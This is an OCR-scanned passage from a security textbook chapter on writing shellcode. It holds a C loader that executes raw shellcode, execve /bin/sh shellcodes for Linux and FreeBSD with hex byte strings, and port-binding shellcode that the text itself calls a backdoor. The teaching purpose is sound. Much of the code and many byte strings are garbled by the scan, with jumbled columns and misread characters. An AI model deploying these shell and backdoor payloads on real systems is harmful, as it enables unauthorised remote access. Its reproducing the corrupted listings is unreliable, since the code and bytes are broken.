v 
1 1 
static void 
12 croak (const char *jnsg) { 
1 3 
fprintf(stderr, "%s\n", msg)j 
14 
fflush(scderr) ; 
15 
16 /« 
17 
* Usage function 
18 
V 
19 
static void 
20 
usage{const char *prgnam) ( 
21 
fprintf(stderr, "\nExecute code : %s -e <nle-containing-shellcode>\nfl, prgnam); 
22 
fprintf[stderr, "Convert code : %s -p <file-containing-shellcode> \n\n", prgnam); 
23 
fflush(stderr) ; 
24 
e x i t l l j ; 
25 
} 
26 
/• 
27 
* Signal error and bail out. 
28 
v 
29 static void 
30 barf(const char *msg) { 
31 
perror(msgj; 
32 
exit 11); 
33 } 
34 
35 /* 
36 
* Main code s t a r t s here 
37 
v 
38 
39 
int 
40 
main(int argc, 
41 
FILE 
42 
void 
43 
int 
44 
45 
int 
46 
int 
47 
48 
struct stat sbuf; 
49 
long 
flen 7 /* Note: assume files are < 2**32 bytes long ;-) */ 
50 
void 
(*fptr)(void); 
51 
52 
if(argc < 3} usage(argv[0)) ; 
53 
if(stattargv[2] H 
&sbuf>) 
barf("failed to stat file"); 
54 
flen = (long) sbuf r st_size; 
55 
if ( ! (code = malloc (flen) ) ) barf ("failed to grab required memeory") ; 
56 
if(!(fp = £open(argv[2] H 
"rb,h)M barfCfailed to open file"); 
57 
if (f read (code, 1, flen, fp) 1= flen) barf ("failed to slurp file") ; 
58 
if (fclose(fp)) 
barf ("failed to close file") ; 
59 
60 
while ((arg = getopt (argcr argv, "eip:")) != -1){ 
61 
switch (arg){ 
char **argv) { 
*fp; 
*code; 
arg; 
i; 
lr 
m = 15; /* max tt of bytes to print on one line */ 

368 
Chapter 9 • Writing Shellcode II 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
76 
77 
78 
79 
80 
81 
82 
83 
84 
S1; 
86 
87 
88 } 
89 
case ' e ' : 
croakl "Calling code . . . " ) , -
fptr = (void (*)(void)) code; 
Cfptr) [) ; 
break; 
case 'p 1: 
printf("\n/* The following shellcode 
printf("\nchar shellcode!] =\n"); 
1 = m; 
f or ti • 0; i < flen; ++i) { 
if(1 >= m) ( 
if(i) 
printf C\"\n">; 
printf{ " \ t \ " " ) ; 
1 = 0; 
1 
+ + 1 ; 
print f("\\x%02>:", 
( (unsigned char 
) 
p r i n t f ( " \ " ; \ n \ n \ n " ) ; 
break; 
default : 
usage(argv[0]); 
) 
} 
rei urn 0; 
is %d bytes long 
Mcode)[ij); 
•An",flen) ; 
To compile the program, type it over in a filename "s-proc.c" and execute the 
command: 
gcc -o s-proc s-proc.c 
Now if you want to try one of the shellcode assembly examples given in this 
chapter, follow these instructions: 
1. Type the instructions in a file with a .S extension 
2. Execute nasm —o <filename> <filename>.S 
3. 
To print the shellcode use: s-proc —p <filename> 
4. To execute the shellcode use: s-proc -e <filename> 
The following shellcode examples will show you how to use nasm and s-proc. 
The Write System Call 
The most appropriate tutorial to start learning how to write shellcode is an example for 
both Linux and FreeBSD that writes "Hello world!" to your terminal. Using the u-rifc 
system call it is possible to write characters to a screen or file. From the write man page, 
we learn that this system call requires the following three arguments: 
• 
A file descriptor 
• 
A pointer to the data 

Writing Shellcode II • Chapter 9 
369 
• 
The amount of bytes of want to write 
As you probably already know, file descriptors are not only handles to files. The file 
descriptors 0, 1, and 2 are used for stdin, stdout, and stderr, respectively.These are special 
file descriptors that can be used to read data and to write normal and error messages. 
We're going to use the stdout file descriptor to print the message "Hello, world!" to the 
terminal.This means that for the first argument we will have to use the value l.The 
second argument will be a pointer to the string "Hello, world!", and the last argument is 
going to be the length of the string. 
The following C program illustrates how we will use the write system call: 
1 int main {) { 
2 
char *string="Hello^ world]"; 
3 
write{l,string,13}; 
4 > 
Because the shellcode requires a pointer to a string, we need to find out the location 
of the string in memory either by pushing it on the stack or by using the jmp/call tech-
nique. In the Linux example, we'll use the jump /call technique and in the FreeBSD 
example, we'll use the push technique. Example 9.1 shows die Linux assembly code that 
prints "Hello, world!" to stdout. 
Example 9.1 Linux Shellcode for "Hello, world!" 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
xor 
xor 
xor 
xor 
jmp short 
code; 
pop 
mov 
mov 
mov 
int 
dec 
mov 
i n t 
string: 
call 
db 
eax,eax 
ebx r ebx 
ecx,ecx 
edxFedx 
stri :-ci 
ecx 
blHl 
dl.13 
al,4 
OxBO 
bl 
a l , l 
0x30 
code 
HHello, world1 
Analysis 
In lines I through 4, we clean the registers using XOR. 
In lines 5 and 6, we jump to the string section and call the code section. As 
explained earlier, the call instruction pushes the instruction pointer on the stack and 
then jumps to the code. 
In line 11, within the code section, we pop the address of the stack into the ECX 
register, which now holds the pointer required for the second argument of the write 
system call. 
In lines 12 and 13, we put the file descriptor number of stdout into the BL register 
and the number of characters we want to write in the DL register. Now all arguments of 

370 
Chapter 9 • Writing Shelkode II 
the system call are ready. The number identifying the write system call is put into the AL 
register in line 13. 
In line 14, we call the kernel to have the system executed. 
Now we need to do an exit(0), because otherwise the code will start an infinite 
loop. Since exit(0) only requires one argument that has to be 0, we decrease the BL reg-
ister (line 12), which still contains I (it was put there in line H) with one byte and put 
the exit system call number in AL (line 14), Finally, exit is called and the program should 
terminate after the string "Hello, world!" is written to stdout. Let's compile and execute 
this assembly code to see if it works: 
1 [root@g.abriel J 8 nasm -o write write.S 
2 [root@gabriel]tt s-proc -e write 
3 Calling code .,. 
4 Hello, world![root@gabriel]# 
Line 4 of the output tells us we forgot to add a new line at the end of the "Hello, 
world!" string.This can be fixed by replacing the string in the shellcode at line 17 
with this: 
db 
"Hello, 
world!',OxOa 
Note that 0x0a is the hex value of a newline character. We also have to add 1 to the 
number of bytes we want to write at line 13 because otherwise the newline character 
isn't written. So replace line 13 with this: 
Let's recompile the assembly code and have a look: 
[root@gabrielJ tt nasni -o write-with-newline write-with-newline.S 
[root@gabriell# s-proc -e write-with-newline 
Calling code ... 
Hello, world! 
[rootfigabriel]* 
As you may glean from the previous example, our newline character is printed and 
makes things look much better. In Example 9.2, we'll use the write system call on 
FreeBSD to display the string Morning!\n by pushing the string on the stack. 
Example 9.2 The Write System Call in FreeBSD 
1 xor eax,eax 
2 cdq 
3 push 
byte 0x0a 
4 push 
0x21676e69 ;!gni 
5 push 
0x6e726f4d ;nroH 
6 mov 
ebx,esp 
7 push 
byte 0x9 
8 push 
ebx 
9 push 
byte 0x1 
10 push 
eax 
11 mov 
al, 0x4 
12 int 
80h 
13 push 
edx 
14 mov 
al.Oxl 
15 int 
OxEO 

Writing Shellcode II • Chapter 9 
371 
Analysis 
In line 1, \vc XOR EAX and make sure EDX also contains zeroes by using the CDQ 
instruction in line 2.This instruction converts a signed DWORD in EAX to a signed 
quad word in EDX. Because EAX only contains zeroes, execution of this instruction 
will result in an EDX register with only zeroes. So why not just use "xor edx.edx" if it 
gets the same result? Well, as you will see later on, the cdq instruction is compiled into 
one byte, while "xor edx,edx" is compiled into two bytes. Using cdq will thus result in a 
smaller shellcode. 
Now we push the string "Morning!" in three steps, first the newline (at line 3), then 
!gni (line 4) followed by nrom (line 5). We store the string location in EBX (line 6) and 
are ready to push the arguments on the stack. Because the stack grows backward, we 
have to start with pushing the number of bytes we'd like to write. In this case, we push 9 
on the stack (line 7). Then, we push the pointer to the string (line 8) and lastly we push 
the file descriptor of stdout, which is 1. All arguments are on the stack now. Before 
calling the kernel, we push EAX one more time on the stack because the FreeBSD 
kernel expects four bytes to be present before the system call arguments. Finally, the 
write system call identifier is stored in the AL register (line 11) and we give the pro-
cessor back to the kernel, which executes the system call (line 12). 
After the kernel executed the write system call, we do an exit to close the process. 
Remember that we pushed EAX on the stack before executing the write system call 
because of the FreeBSD kernel calling convention (line 10). These four bytes are still on 
the stack and as they are all zeroes, we can use them as the argument for the exit system 
call. So all we have to do is push another four bytes (line 13), put the identifier of exit in 
AL (line 14), and call the kernel (line 15). 
Now, let's test the assembly code and convert it to shellcode: 
bash-2.05b$ nasm -o write write.S 
bash-2.05b$ s-proc -e write 
Calling code .., 
Morning! 
bash-2.05b$ 
baah-2.05b$ ./s-proc -p write 
/* The following shellcode is 32 bytes long: */ 
char shellcode[] = 
"\x31\xc0\x99\x6a\xOa\x68\x69\x6e\x67\x21\x6S\x4d\x6£\x72\x6e" 
*\x89\xe3\x6a\xO9\x53\x6a\x01\x5CHxb0\x04\xcd\x80\x52\xbO\x01" 
"\xcd\x80"; 
bash-2.05b$ 
!""£""! 
It worked! The message was printed to strdout and our shellcode contains no NULL 
UUaJMU bytes.To be sure the system calls are used correctly and the message wasn't printed to 
our screen by luck, we'll trace the program using ktrace.This will show how the shell-
code uses the write and exit system calls: 
1 bash-2.05b$ ktrace s-proc -e write 
2 Calling code ,,. 

372 
Chapter 9 • Writing Shellcode II 
3 
Morning! 
4 
basli-2_05b$ kdump 
5 
-- snip snip --
6 
4866 s-proc 
RET 
execve 0 
7 
4866 s-proc 
CALL 
mmapIO,OxaaS,0x3,0x1000,Oxffffffft,0,0,0) 
8 
4866 s-proe 
RET 
mmap 671485952/0x28061000 
9 
4866 s-proc 
CALL 
munmap10x28061000.0xaa8J 
10 
-- snip snip — 
11 
4866 s-proc 
RET 
write 17/0x11 
12 
4866 s-proc 
CALL 
write(0x1,OxbfbffaSO,0x9) 
13 
4866 s-proc 
GIO 
fd 1 wrote 9 bytes 
14 
"Morning! 
15 
16 
4866 s-proc 
RET 
write 9 
17 
4866 s-proc 
CALL 
exit(0) 
At lines 12 and 17 we see that the write and exit system calls are executed just the 
way we implemented them. 
A 
NOTE I 
On Linux, you can trace system calls using the open-source freeware strace 
utility. 
execve Shellcode 
The execve shellcode is probably the most used shellcode in the world. The goal of this 
shellcode is to let the application into which it is being injected run an application such 
as /bin/sh. We will discuss several implementations of execve shellcode for both the 
Linux and FreeBSD operating systems using the jnip/call and push techniques. If you 
look at the Linux and FreeBSD man page of the execve system call, you will find it has 
to be implemented like the following: 
int execve(const char *path. char *const argv[], char * const envp[])? 
The first argument has to be a pointer to a string that represents the file we like to 
execute. The second argument is a pointer to an array of pointers to strings. These 
pointers point to the arguments that should be given to the program upon execution. 
The last argument is also an array of pointers to strings. These strings are the environ-
ment variables we want the program to receive. Example 9.3 shows how we can imple-
ment this function in a simple C program. 
"™M^ Example 9.3 execve Shellcode in C 
Hi 
• ^ ^ ^ H 
I 
int mainO { 
2 char ^program-"/bin/echo"; 
3 char *argone=MHello 3•; 
4 
char *arguments(3] ; 
5 arguments 10} = program? 
6 
argumentsJl] = argone; 
7 arguments[2] = 0; 

Writing Shellcode II • Chapter 9 
373 
8 
execve(program,arguments, 0) ; 
9 
} 
Analysis 
At lines 2 and 3, we define the program that we'd like to execute and the argument we 
want the program to be given upon execution. 
In line 4, we initialize the array of pointers to characters (strings) and then in lines 5 
through 7 we fill the array with a pointer to our program, a pointer to the argument we 
want the program to receive, and a (} to terminate the array. 
At line 8, we call execve with the program name, argument pointers, and a NULL 
pointer for the environment variable list. 
Now, let's compile and execute the program: 
bash-2.05b$ gcc -o execve execve.c 
bash-2.05b$ ./execve 
Hello 1 
bash-2.05b$ 
Now that we know how execve has to be implemented in C, it's time to implement 
execve code that executes "/bin/sh" in assembly. Since we won't be executing "/bin/sh" 
with any argument or environment variables, we can use a 0 for the second and third 
argument of the system call. The system call will therefore look like this in C: 
e x e c v e ( " / b i n / s h " , 0, 0) ; 
Let's have a look at the assembly code in Example 9.4. 
Example 9.4 FreeBSD execve jmp/call Style 
1 
BITS 32 
2 
jmp s h o r t 
3 
d o i t : 
4 
pop 
5 
xor 
6 
mov b y t e 
7 
push 
8 
push 
9 
push 
10 mov 
11 
push 
12 
i n t 
1 3 
c a l l i t : 
1 4 
c a l l 
1 5 
db 
Analysis 
c a l l i t 
fi3 i 
eax, 
eax 
[ e s i + 7 ) , 
a l 
eax 
eax 
e s i 
a l . 5 9 
eax 
OxBO 
d o i t 
' / b i n / s h ' 
First, we do the jmp/call trick to find out the location of the string "/bin/sh". At line 2, 
we jump to the callit function at line 13, and then we call the doit function at line 14. 
The call instruction will push the instruction pointer (ESP register) on the stack and 
jumps to doit. Within the doit function, we first pop the instruction pointer from the 

374 
Chapter 9 • Writing Shelkode II 
stack and store it in the ESI register. This pointer references the string "/bin/sh" and can 
be used as the first argument in the system call. 
Now we have to NULL terminate the string. We make sure EAX contains only 
zeroes by using XOR at line 5. We then move one byte from this register to the end of 
the string using "mov byte" at line 6. 
At this point we are ready to put the arguments on the stack. Because EAX still 
contains zeroes, we can use it for the second and third arguments of the system call. We 
do this by pushing the register two times on the stack (lines 7 and 8).Then we push the 
pointer to "/bin/sh" on the stack (line 9) and store the system call number for execve in 
the EAX register (line 10). 
As mentioned earlier, the FreeBSD kernel calling convention expects four bytes to 
be present in front of the system call arguments. In this case, it really doesn't matter what 
the four bytes are, so we push EAX one more time on the stack in line 11. 
Everything is ready, so at line 12 we give the processor back to the kernel so that it 
can execute our system call. Let's compile and test the shellcode: 
bash-2.05bS nasm -o execve execve.£ 
bash-2. 05b$ s-proc -p execve 
/* The following shellcode is 28 bytes long; V 
char shellcode[] = 
"\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b\x50\xcd" 
"\x80\xe3\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'1; 
bash-2.05bS s-proc -e execve 
Calling code . . . 
I he shelkode worked and is only 2S bytes long, which isn't bad .it all. 
NOTE 
As an exercise and for some practice, create shellcode that open()'s a file, 
write()'s data to it and then dose{)'s the file. Make sure that at least one new-
line and NULL byte are written to the file. Another good exercise would be to 
create shellcode that reads from a file, makes a socket connection to a remote 
host, and then writes the file to the socket. 
Example 9.3 used the jmp/call technique, which is overkill. If we push the /bin/sh 
string on the stack, the resulting shellcode will be much smaller and does exactly the 
same. Example 9.5 is a better implementation of the execve system call. 
Example 9.5 FreeBSD execve Push Style 
1 
BITS 32 
2 
\ 
3 
xor eaxHeax 

Writing Shellcode II • Chapter 9 
375 
4 
pusheax 
5 
push 
6 
push 
7 
mov 
8 
push 
9 
p ish 
10 
push 
1 1 
mov a l , 
12 
push 
1 3 
i n t 
Analysis 
0xGS"732fGe 
Gx69622f2f 
ebx, 
esp 
eax 
eax 
ebx 
59 
eax 
3 Oh 
Using the push instruction, we craft the string //bin/sh on the stack.The extra slash in 
the beginning is not a spelling mistake; it is added to make the string eight bytes so that 
it can be put on the stack using two push instructions (lines 5 and 6). 
First, we make sure the EAX register contains only zeroes by using XOR at line 3. 
Then we push this register's content on the stack so that it can function as string termi-
nator. Now we can push //bin/sh in two steps. Remember that the stack grows back-
wards, so first hs/n (line 5) is pushed and then ib// (line 6). 
Now that the string is located on the stack, we store the stack pointer ESP (which 
points to the string) in the register EBX. At this point, we are ready to put the argu-
ments in place and call the kernel. Because we don't need to execute /bin/sh with any 
arguments or environment variables, we push EAX, which still contains zeroes, twice on 
the stack (lines 8 and 9) so that its content can function as the second and third argu-
ment of the system call.Then we push EBX, which holds the pointer to //bin/sh on 
the stack (line 10) and store the execve system call number in the AL register (line 11) 
so that the kernel knows what system call we want to have executed. Now EAX is once 
again pushed on the stack because of the FreeBSD calling convention (line 12). 
Everything is put in place and we can give the processor back to the kernel at line 13. 
As you can see, this assembly code is much smaller than the code in Example 9.3 
but does the same thing.The push method is more efficient and highly recommended 
for developing shellcode. Let's test and convert the shellcode to a string: 
" ''* ''h w 
1 
ba^h-2.05b5 rtasm -o b i n - s h b i n - s h . S 
2 
basli-2.05bS s-proc -p b i n - s h 
3 
4 
/* The following s h e l l c o d e is 23 b y t e s long: 
*/ 
5 
6 
char s h e l l c o d e [ J 
= 
7 
-\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x3f\x2f\x62\x69\x89\xe3-
8 
-\x50\x50\xS3\x50\xb0\x3b\xcd\x8O"; 
9 
10 
11 
bash-2.05b$ s-proc -e b i n - s h 
1 2 
C a l l i n g code 
. . . 
1 3 
$ 
As you can see, /bin/sh was executed on line 13, so the shellcode worked! Note 
that the shellcode is only 23 bytes long, which means we saved five bytes by using the 
push technique rather than the jmp/call technique. Now let's have a look at how we can 
use the push method to use execve with multiple arguments. 

376 
Chapter 9 • Writing Shelkode II 
When using arguments in an execve call, you need to create an array of pointers to 
the strings that together represent your arguments.The arguments array's first pointer 
should point to the program you are executing. In Example 9.6, we will create execve 
code that executes the command /hin/sh —c date. In p sen do -code, the execve system call 
will look like this: 
execve (Vbin/sh-, (Vbin/sh", "-c", -date" ,0}, 0) ; 
t£ M H Example 9.6 FreeBSD execve Push Style, Several Arguments 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
BITS 32 
xor 
push 
push 
push 
mov 
push 
push word 
mov 
push 
push 
mov 
push 
push 
push 
push 
mov 
push 
push 
push 
mov 
push 
int 
eax.eax 
eax 
0x68732£6e 
0x69622f2f 
ebx, esp 
eax 
0x632d 
edxH esp 
eax 
0x65746164 
ecx, esp 
eax ; NULL 
ecx 7 pointer 
edx ; pointer 
ebx ; pointer 
ecx.esp 
eax 
ecx 
ebx 
al,0x59 
eax 
QxSO 
to date 
to "-c" 
to V/bin/sh" 
The only difference between this code and the earlier explained execve shellcode is 
that we need to push the arguments on the stack and have to create an array with 
pointers to these arguments. 
Analysis 
Lines 7 through 17 are new; the rest of the code was discussed earlier in this chapter. To 
craft the array with pointers to the arguments, we first need to push the arguments on 
the stack and store their locations. 
In line 7, we prepare the -c argument by pushing EAX on the stack so that its value 
can function as a string terminator. 
At line 8, we push c- on the stack as a word value (two bytes). If we don't use 
"word" here, nasm will translate push 0x632d into push 0x000063ed, which will result 
in shellcode that contains two NULL bytes. 

Writing Shellcode II • Chapter 9 
377 
Now that the -c argument is on the stack, in line 9 we store the stack pointer in the 
EDX register and move on to prepare the next argument that is the string date. 
In line 10, we again push EAX on the stack as string terminator. 
In lines 11 and 12, we push the string ctad and store the value or the stack pointer in 
the ECX register. 
NOTE 
The strings < and date are pushed in reverse order on the stack as c- and etad, 
because the stack grows backwards. 
We have the pointers to all our arguments and can prepare the array of pointers. 
Like all arrays, it must be NULL-terminated and we do this by first pushing EAX on 
rhe stack (line 13).Then we push the pointer to date, followed by the pointer to -c, 
which is followed by the pointer to //bin/sh.The stack should now look like this: 
0x0000000068732f6e69622f2£00000000632d000000006574616400000000aaaabbbbccec 
"//bda/sh" 
"-C- 
"date1 
The values aaaabbbbcccc are the pointers to date, -c, and //bin/sh.The array is 
ready and we store its location in the ECX register (line 17) so that it can be used as the 
second argument of the execve system call (line 19). In lines 18 through 23, we push the 
system call arguments on the stack, place the execve system call identifier in the AL 
(EAX) register. Now the processor is given back to the kernel so that it can execute the 
system call. 
Let's compile and test the shellcode: 
bash-2.05b$ nasm -o bin-sh-three-arguments bin-sh-three-arguments.S 
bash-2.05b$ s-proc -p bin-eh-three-arguments 
/* The following shellcode is 44 bytes long: */ 
char shellcode[] = 
-\xmxcO\x50\x68\x6e\x2t\x73\x68\x6B\x2f\x2f\x62\x69\x8S\xe3" 
-\x50\x66\x68\x2d\x63\x89\xe2\x50\x68\x64\x61\x74\x65\x89\xel" 
"\x50\x51\x52\x53\x89\xel\x50\x51\x53\x50\xb0\x3b\xcd\x80-; 
bash-2.05b$ s-proc -e bin-sh-three-arguments 
Calling code . .. 
Sun Jun 
1 16:54:01 CEST 2003 
bash-2.05b$ 
The date was printed, so the shellcode worked! 
Let's look at how the execve system call can be used on Linux with the old school 
jmp/call method. The implementation of execve on Linux is very similar to that on 
FreeBSD, with the main difference being how the system call arguments are delivered to 
the Linux kernel using the assembly code. Remember that Linux expects system call 
arguments to be present in the registers while FreeBSD expects the system call argu-

Chapter 9 • Writing Shelkode II 
ments to be present on the stack. Here's how an execve of /bin/sh should be imple-
mented in C on Linux: 
int main!) ( 
char *command=" /bin/sh*; 
char *args[2]; 
args[0] = command; 
argsli] = 0; 
execvetcommand,argsj0); 
) 
Unlike on FreeBSD, we cannot use the value 0 for the second argument of the 
execve system call. We therefore have to create an array with pointers to strings that can 
be used in the system call. The array, named args in the preceding code, needs to start 
with a pointer to the "command" string. Example 9.7 shows a translation of the C 
example to assembly. 
Example 9.7 Linux execve jmp/call Style 
1 
BITS 32 
2 
jmp s h o r t 
3 
d o i t ; 
4 
pop 
5 
xor 
6 
cdq 
7 
mov b y t e 
o 
mov long 
9 
mov long 
1 0 
l e a 
11 
mov byte 
12 
int 
13 
c a l l i t : 
14 
call 
15 
db 
Analysis 
c a l l i t 
ebx 
eax, 
eax 
[ebx + 7 1 , 
[ebx + SI, 
[ebx + 12] 
e c x , [ ebx 
a l , 
OxOb 
0x80 
d o i t 
' / b i n / s h ' 
.n: 
ebx 
, eax 
+ B] 
First we do the jmp/call trick to get the memory address of the string /bin/sh and then 
store this address in the EBX register (lines 2 through 4 and 13 through 14). Then EAX 
is XOR'ed (line 5) and used to terminate the string /bin/sh (line 7). We also make sure 
EDX contains zeroes only by using the CDQ instruction. EDX is going to represent the 
third argument and we'll leave it untouched. The first and third arguments of the system 
call are ready. 
Now we have to create the second argument of the execve call: an array with 
pointers to strings.The first pointer must point to the program we are going to execute. 
We thetefore store the value in the EBX register, which is a pointer to /bin/sh, behind 
the string itself (line 8).Then we put the value in EAX, which only contains zeroes, 
behind the "/bin/sh" pointer (line 9).The zeroes will function as array terminator. 

Writing Shellcode II • Chapter 9 
379 
,« 
I V N E I E S S 
The location of the pointer to /bin/sh followed by the NULL pointer is loaded in 
ECX (line 10), so the memory behind the string /bin/sh now looks like this: 
0AAAA0000. 
In line 7, we place a zero behind the string to terminate it.The A's represent the 
pointer to the string /bin/sh, placed there by line 8, and Os, placed by line 9.These are 
used to terminate the args array. So in pseudo-code, the execve call will look like the 
following: 
e x e c v e I " p o i n t e r to / b i n / s h O " , " p o i n t e r to fiAAAOOOO", 0) ; 
In line 11, we place the execve system call number for Linux in the AL register and 
then give the processor back to the kernel (line 12), which will execute the system call 
for us. Let's test and print the shellcode: 
[twenteigabriel execve]! s-proc -p execve 
I* The following shellcode is 34 bytes long: */ 
char shellcode[] = 
•\xeb\xl4\x5b\x31\xc0\x99\x8S\x43\xO7\x89\x5b\xO8\x89\x43\x0c" 
"\x8d\x4b\x08\xb0\x0b\xcd\x80\xe8\xe7\xff\xff\xi£\x2f\x62\x69" 
"\x6e\x2i\x73\x68"; 
[cwente@gabriel execve]# s-proc -e execve 
Calling code . . . 
Sh-2.M# 
It worked, but unfortunately the shellcode is rather big when compared to the ear-
lier FrecBSD execve shellcodes. In Example 9,8, we'll look at assembly instructions that 
also do an execve of/bin/sh. The main difference is that the jmp/call technique isn't 
used, making the resulting shellcode more efficient. 
Example 9.8 Linux push execve Shellcode 
1 
BITS 32 
2 
xor 
e a x , e a x 
3 
cdq 
4 
push eax 
5 
push long 
0x68732f2£ 
6 
push long 0x6e69622f 
7 
mov 
e b x . e s p 
8 
push eax 
9 
push ebx 
mov 
e c x , e s p 
10 
11 
mov a l , 
0x0b 
12 
i n t 
0x80 
Analysis 
As usual, we start off with cleaning the registers we're going to use. First, we XOR EAX 
with itself (line 2) and then do a CDQ so that EDX also contains zeroes only. We'll leave 
EDX further untouched as it is ready to serve as the third argument for the system call. 

380 
Chapter 9 • Writing Shelkode II 
We now create the string on the stack by pushing EAX as string terminated, fol-
lowed by the string /bin/sh (lines 4, 5, and 6). We store the pointer to the string in EBX 
(line 7). With this, the first argument is ready. Now that we have the pointer, we build 
the array by pushing EAX first (it will serve as array terminator), followed by the pointer 
to /bin/sh (line 9). We now load the pointer to the array in the ECX register so that we 
can use it as the second argument of the system call. 
All arguments are ready. We put the Linux execve system call number in the AL reg-
ister and give the processor back to the kernel so that our code can be executed (lines 
11 and 12). 
Execution 
Let's compile, print, and test the code: 
[gabriel§root execve]# s-proc -p execve 
/* The following shellcode is 24 bytes long: *J 
char shellcode[] = 
•\x31\xc0\x99\x50\x63\x2f\x2f\x73\x6S\x68\x2f\x62\x69\x6e\x89" 
"\xe3\K5O\x53\x69\xel\xbO\x0b\xcd\x80"; 
[gabriel@root execve]# s-proc -e execve 
Calling code ... 
sh-2.04# 
Not only did the shellcode work, it has become ten bytes smaller! 
NOTE 
A useful exercise at this point would be to try and create Linux execve shellcode 
that executes the command /bin/sh -c date. Hint: push the arguments and add 
their pointers to the args array. 
Port Binding Shellcode 
Port binding shellcode is often used to exploit remote program vulnerabilities. The shell-
code opens a port and executes a shell when someone connects to the port. So, basically, 
the shellcode is a backdoor on the remote system. 
NOTE 
Be careful when executing port binding shellcode! It creates a backdoor on 
your system as long as it's running! 

Writing Shellcode II • Chapter 9 
381 
This is the first example where you will see that it is possible to execute several 
system calls in a row and how the return value from one system call can be used as an 
argument for a second system call. The C code in Example 9.9 does exactly what we 
want to do with our port binding shellcode. 
j _ Example 9.9 Binding a Shell 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
#inc 
#inc 
#inc 
i n t 
StTX. 
i n t 
{ 
} 
:lude 
:lude 
:lude 
soc, 
<unistd. h> 
<sys/socket.h> 
<net inet/in.h> 
c l i ; 
ict sockaddr, 
main 0 
_in serv_addrj 
serv_addr.sin_familY=2? 
serv_addr.sin_addr,s_addr=0; 
serv_addr.sin_port=0xAAAA? 
soc=socket(2,1,0); 
bind(soc,(struct sockaddr *)&serv_addr,0x10) ; 
listen{soc,1); 
cli=accept (SOC,0r 0}t 
dup2(cli,0); 
dup2(cli,l); 
dup2(cli,2)j 
eKecve (M /bin/shr>, 0, 0) ; 
Analysis 
In order to bind a shell to a port, we need to execute the socket (line 14), bind (line 15), 
listen (line 16), accept (line 17), dup2 (lines 18 through 20), and execve (line 21) system 
calls successfully. 
The socket system call (line 14) is very easy because all arguments are integers. 
When the socket system call is executed, we have to store its return value at a safe place 
because that value has to be used as the argument of the bind, listen, and accept system 
calls.The bind system call is the most difficult because it requires a pointer to a struc-
ture. We therefore need to build a structure and get the pointer to it the same way we 
have built and obtained pointers to strings by pushing them on the stack. 
After the accept system call is executed, we get a file descriptor to the socket. This 
file descriptor allows us to communicate with the socket. Because we want to give the 
connected person an interactive shell, we will duplicate stdin, stdout, and stderr with the 
socket (lines 18 through 20), and then execute the shell (line 21). Because stdin, stdout, 
and stderr are dup'ed to the socket, everything sent to the socket will be sent to the 
shell, and everything written to stdin or stdout by the shell is sent to the socket. 
The assembly code in Example 9.10 binds a shell to a port on FreeBSD systems. 
This code is written a bit differently then the previous FreeBSD examples. Remember 
how the FreeBSD calling convention requires you to push four extra bytes behind your 

382 
Chapter 9 • Writing Shellcode II 
I V N U H I 
arguments on the stack before executing a system call and that these four bytes remain 
on the stack after the system call has been executed? Well, we're going to use these bytes 
to already start pushing the arguments for the next system call. Because the port binding 
shellcode requires you to use several system calls, this will save a lot of bytes and will 
result in probably the smallest port binding shellcode for FreeBSD currently available. 
Unfortunately, it makes the shellcode a bit more difficult to explain, so we will discuss it 
system call by system call. 
Example 9.10 FreeBSD Port Binding Shellcode 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
BITS 
x o r 
x o r 
c d q 
p u s h 
p u s h 
p u s h 
p u s h 
mov 
i nr 
x c h g 
p u s h 
mov 
p u s h 
p u s h 
p u s h 
mov 
p u s h 
Lnt 
p u s h 
mov 
p u s h 
i n t 
p u s h 
p u s h 
c d q 
mov 
p u s h 
i n t 
mov 
mov 
lOOp: 
p u s h 
mov 
i n c 
p u s h 
i n t 
l o o p 
p u s h 
p u s h 
p u s h 
mov 
32 
b y t e 
b y t e 
b y t e 
b y t e 
lOOp 
e c x 
e c x . 
e c x 
e a x . 
e a x 
e a x 
0 x 0 1 
0x02 
e a x 
a l , 9 7 
0x80 
e d x , e a x 
0xAAAA02AA 
e s i . e s p 
0x10 
e s i 
e d x 
a l , 1 0 4 
0 x 1 
0x80 
e d x 
a l , 1 0 6 
e c x 
0x80 
e a x 
e d x 
a l , 3 0 
e d x 
0x80 
c l r 3 
e b x , e a x 
e b x 
a l , 9 0 
e d x 
e d x 
0x80 
0 x S 8 7 3 2 f 6 e 
0 x 6 9 6 2 2 £ 2 f 
e b x , 
e s p 

Writing Shellcode II • Chapter 9 
383 
46 
47 
48 
49 
50 
51 
push 
push 
push 
push 
mov a 1, 
int 
ecx 
ecx 
ebx 
eax 
59 
Oxso 
The socket System Call 
Using the socket system call you can create a network socket.The domain argument 
specifies a communications domain; for example, I NET (for IP). The type of socket is 
specified by the second argument.You could, for example, create a raw socket to inject 
special crafted packets on a network.The protocol argument specifies a particular pro-
tocol to be used with the socket; for example, IP. 
M i ; i 
1 
xor 
ecx, ecx 
2 mul 
ecx 
3 cdq 
4 push 
eax 
5 push byte 
0x01 
6 push byte 
0x02 
7 push 
eax 
8 mov 
at, 97 
9 
int 
0x80 
1 0 xchg 
edx, eax 
Analysis 
The socket system call is a very easy one because it requires only three integers. First, 
make sure the registers are clean. In lines 1 and 2, we the ECX and EAX registers with 
themselves so that they only contain zeros. Then we do a CDQ with the result that 
EDX is also clean. Using CDQ instead of "xor edx,edx7' results in shellcode that is one 
byte smaller. 
After the registers are initialized, we push the arguments, first the 0 (line 4) and then 
the 1 and 2 (lines 5 and 6). Afterward, we push EAX again (FreeBSD calling conven-
tion), put the system call identifier for socket in the AL register and call the kernel (lines 
8 and 9).The system call is executed and the return value is stored in EAX. We store the 
value in the EDX register using the xchg instruction. The instruction swaps the content 
between the registers EAX and EDX with the result that EAX contains EDX's content 
and EDX contains EAX's content. 
